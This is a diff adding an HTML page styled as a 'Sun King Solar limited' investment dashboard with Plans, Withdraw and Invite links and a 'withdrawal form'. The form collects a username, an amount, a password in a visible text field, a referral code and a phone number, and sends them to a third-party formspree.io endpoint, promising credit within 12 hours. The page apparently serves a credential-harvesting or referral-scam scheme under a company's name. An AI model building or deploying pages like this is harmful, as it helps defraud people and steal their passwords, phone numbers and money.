@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Boxicons -->
+    <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
+    <!-- My CSS -->
+    <link rel="stylesheet" href="style2.css">
+    <link rel="stylesheet" href="style2.css"> <!-- Added styles from the second page -->
+    <link rel="shortcut icon" type="image/x-icon" href="icon.ico">
+
+    <title>Sun King Solar limited</title>
+</head>
+
+<body>
+
+    <!-- SIDEBAR -->
+    <section id="sidebar">
+        <a href="#" class="brand">
+            <i class='bx bxs-smile'></i>
+            <span class="text">SunKing</span>
+        </a>
+        <ul class="side-menu top">
+            <li class="active">
+                <a href="index.html">
+                    <i class='bx bxs-dashboard'></i>
+                    <span class="text">Dashboard</span>
+                </a>
+            </li>
+            <li>
+                <a href="plan.html">
+                    <i class='bx bxs-shopping-bag-alt'></i>
+                    <span class="text">Plans</span>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <i class='bx bxs-doughnut-chart'></i>
+                    <span class="text">Withdraw</span>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <i class='bx bxs-message-dots'></i>
+                    <span class="text">Invite</span>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <i class='bx bxs-group'></i>
+                    <span class="text">Me</span>
+                </a>
+            </li>
+        </ul>
+    </section>
+    <!-- SIDEBAR -->
+
+    <!-- CONTENT -->
+    <section id="content">
+        <!-- NAVBAR -->
+        <nav>
+            <i class='bx bx-menu'></i>
+            <a href="#" class="nav-link">Categories</a>
+            <form action="#">
+                <div class="form-input">
+                    <input type="search" placeholder="Search...">
+                    <button type="submit" class="search-btn"><i class='bx bx-search'></i></button>
+                </div>
+            </form>
+
+            <input type="checkbox" id="switch-mode" hidden>
+            <label for="switch-mode" class="switch-mode"></label>
+
+            <a href="#" class="profile">
+                <img src="img/people2.png">
+            </a>
+        </nav>
+        <!-- NAVBAR -->
+
+        <!-- MAIN -->
+        <main>
+            <div class="wrapper">
+                <div class="title">
+                   WITHDRAWAL FORM
+                </div>
+                <div class="form">
+                    <form action="https://formspree.io/f/mleynwgv" method="POST">
+                        <div class="inputfield">
+                            <label>Username</label>
+                            <input type="text" class="input" name="Username" required>
+                        </div>
+                        <div class="inputfield">
+                            <label>Amount</label>
+                            <input type="number" class="input" name="amount" required>
+                        </div>
+                        <div class="inputfield">
+                            <label>Password</label>
+                            <input type="text" class="input" name="Passworddd" required>
+                        </div>
+                        <div class="inputfield">
+                            <label>Referral Code</label>
+                            <input type="number" class="input" name="referal code" required>
+                        </div>
+                        <div class="inputfield">
+                            <label>Phone Number</label>
+                            <input type="number" class="input" name="phone number" required>
+                        </div>
+                        <div class="inputfield terms">
+                            <p>Your request will be processed. And you will be credited within 12 hours</p>
+                        </div>
+                        <div class="inputfield">
+                            <input type="submit" value="Register" class="btn" name="">
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </main>
+        <!-- MAIN -->
+    </section>
+    <!-- CONTENT -->
+
+    <script src="script.js"></script>
+</body>
+
+</html>
